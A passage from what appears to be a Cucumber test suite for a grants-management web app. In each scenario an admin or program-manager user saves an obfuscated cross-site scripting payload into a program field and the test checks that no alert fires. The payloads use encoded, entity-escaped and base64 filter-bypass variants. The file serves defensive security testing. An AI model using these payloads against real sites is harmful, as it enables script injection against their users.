      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                          | Field                |
      | <script>\u0061lert(1)</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301154 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                          | Field                |
      | <script>\u{61}lert(1)</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301157 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                  | Field                |
      | <script>\u{0000000061}lert(1)</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301160 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                | Field                |
      | <script>eval('\x61lert(1)')</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301162 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                           | Field                |
      | <script>eval('\141lert(1)')</script>  <script>eval('alert(\061)')</script>  <script>eval('alert(\61)')</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301178 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                               | Field                |
      | <a href="&#106;avascript:alert(1)">XSS</a><a href="&#106avascript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301181 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                  | Field                |
      | <svg><script>&#97;lert(1)</script></svg>  <svg><script>&#x61;lert(1)</script></svg>  <svg><script>alert&NewLine;(1)</script></svg>  <svg><script>x="&quot;,alert(1)//";</script></svg> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301182 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                         | Field                |
      | <a href="&#0000106avascript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301184 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                      | Field                |
      | <a href="&#x6a;avascript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301187 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                             | Field                |
      | a href="j&#x61vascript:alert(1)">XSS</a>  <a href="&#x6a  avascript:alert(1)">XSS</a>  <a href="&#x6a avascript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301216 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                            | Field                |
      | <a href="&#x0000006a;avascript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301220 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                      | Field                |
      | <a href="&#X6A;avascript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301236 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                          | Field                |
      | <a href="javascript&colon;alert(1)">XSS</a>  <a href="java&Tab;script:alert(1)">XSS</a>  <a href="java&NewLine;script:alert(1)">XSS</a>  <a href="javascript&colon;alert&lpar;1&rpar;">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301240 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                              | Field                |
      | <a href="javascript:x='%27-alert(1)-%27';">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301243 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                     | Field                |
      | <a href="javascript:x='&percnt;27-alert(1)-%27';">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301248 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                          | Field                |
      | <script src=data:text/javascript;base64,YWxlcnQoMSk=></script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301251 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                      | Field                |
      | <script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
